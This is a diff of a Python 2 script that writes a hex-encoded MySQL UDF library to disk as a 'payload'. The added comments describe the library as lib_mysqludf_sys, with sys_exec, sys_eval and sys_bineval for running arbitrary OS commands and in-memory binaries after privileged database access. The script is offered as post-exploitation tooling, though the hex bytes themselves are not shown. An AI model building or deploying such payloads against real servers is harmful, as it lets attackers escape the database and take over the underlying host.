@@ -1,3 +1,9 @@
+# lib_mysqludf_sys v0.0.4 is a malicious MySQL User Defined Function (UDF) library compiled as a 32-bit Linux ELF binary using GCC 4.3.2 (Debian). 
+# When loaded as a plugin into a MySQL instance, it exposes OS-level functions directly through SQL queries. 
+# Key functions include sys_exec() and sys_eval() for running arbitrary system commands, sys_get() and sys_set() for environment variable manipulation, and sys_bineval() for executing a binary directly from memory. 
+# It is widely known as a post-exploitation tool used after gaining privileged MySQL access, allowing an attacker to break out of the database context and interact with the underlying operating system.
+
+
 #!/usr/bin/python2
 
 import sys
@@ -15,8 +21,8 @@ shellcode_x32 = (
 
 def create_udf_payload(output_file):
     try:
-        with open(output_file, 'wb') as f:  # Substituir conforme necessário para Python 2
-            f.write(shellcode_x32.decode('hex'))  # Em Python 2, strings hexadecimais podem ser decodificadas assim
+        with open(output_file, 'wb') as f:  
+            f.write(shellcode_x32.decode('hex')) 
         print "Payload criado com sucesso em:", output_file
     except Exception as e:
         print "Erro ao criar payload:", str(e)
